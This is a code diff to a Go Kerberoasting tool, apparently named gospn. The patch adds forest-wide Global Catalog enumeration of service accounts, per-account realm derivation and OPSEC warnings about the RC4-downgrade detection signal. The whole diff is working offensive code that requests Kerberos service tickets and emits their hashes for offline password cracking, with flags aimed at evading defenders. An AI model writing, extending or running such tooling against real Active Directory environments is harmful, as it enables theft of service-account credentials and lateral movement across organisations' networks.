@@ -24,6 +24,7 @@ type Config struct {
 	ExtraFilter string
 	TGTDeleg    bool // use the TGT-delegation trick to request RC4 tickets
 	RC4OpSec    bool // only target RC4-capable, AES-incapable accounts (no downgrade signal)
+	UseGC       bool // query the Global Catalog (forest-wide) instead of the domain
 
 	// deleg holds the forwarded TGT extracted via the delegation trick, lazily
 	// populated on first use when TGTDeleg is set.
@@ -59,6 +60,12 @@ func Run(cfg *Config) error {
 		return fmt.Errorf("an enumeration method is required: pass -method ldap or -method adws (or target one -spn)")
 	}
 
+	// Global Catalog querying is only wired up over LDAP (3268/3269). ADWS
+	// rejects the gc instance / empty base object, so steer the operator there.
+	if cfg.UseGC && cfg.Method == "adws" {
+		return fmt.Errorf("-gc is supported only with -method ldap (ADWS Global Catalog querying is not supported); use: gospn -method ldap -gc")
+	}
+
 	if err := resolveDomainAndDC(cfg); err != nil {
 		return err
 	}
@@ -87,8 +94,14 @@ func Run(cfg *Config) error {
 	if cfg.User != "" {
 		fmt.Printf("[*] Target User            : %s\r\n", cfg.User)
 	}
+	if cfg.UseGC {
+		fmt.Print("[*] Source                 : forest-wide Global Catalog\r\n")
+	}
 	if cfg.RC4OpSec {
 		fmt.Print("[*] OPSEC                  : skipping AES-advertising accounts (no RC4-downgrade signal)\r\n")
+		if cfg.UseGC {
+			fmt.Print("[!] Note                   : msDS-SupportedEncryptionTypes may be absent in the GC; -rc4opsec is less reliable here\r\n")
+		}
 	}
 
 	targets, err := enumerate(cfg)
@@ -143,12 +156,32 @@ func roastOne(cfg *Config, t roastTarget) error {
 	if cfg.deleg != nil {
 		hash, err = getTGSRepHashDeleg(cfg.deleg, t.SPN, t.SAMAccountName)
 	} else {
-		hash, err = getTGSRepHash(t.SPN, t.SAMAccountName, cfg.Domain)
+		// Forest-wide (GC) results can live in other domains; derive the realm
+		// from the account DN so the hash is labelled with the right realm.
+		realm := cfg.Domain
+		if r := realmFromDN(t.DistinguishedName); r != "" {
+			realm = r
+		}
+		hash, err = getTGSRepHash(t.SPN, t.SAMAccountName, realm)
 	}
 	if err != nil {
 		return err
 	}
 	return emitHash(cfg.OutFile, hash)
+}
+
+// realmFromDN extracts the Kerberos realm from a distinguishedName by joining
+// its DC= components, e.g. "CN=svc,OU=x,DC=corp,DC=example,DC=com" ->
+// "CORP.EXAMPLE.COM". Returns "" if the DN has no DC components.
+func realmFromDN(dn string) string {
+	var parts []string
+	for _, comp := range strings.Split(dn, ",") {
+		comp = strings.TrimSpace(comp)
+		if len(comp) > 3 && strings.EqualFold(comp[:3], "DC=") {
+			parts = append(parts, comp[3:])
+		}
+	}
+	return strings.ToUpper(strings.Join(parts, "."))
 }
 
 // emitHash prints a hash or appends it to the configured output file.
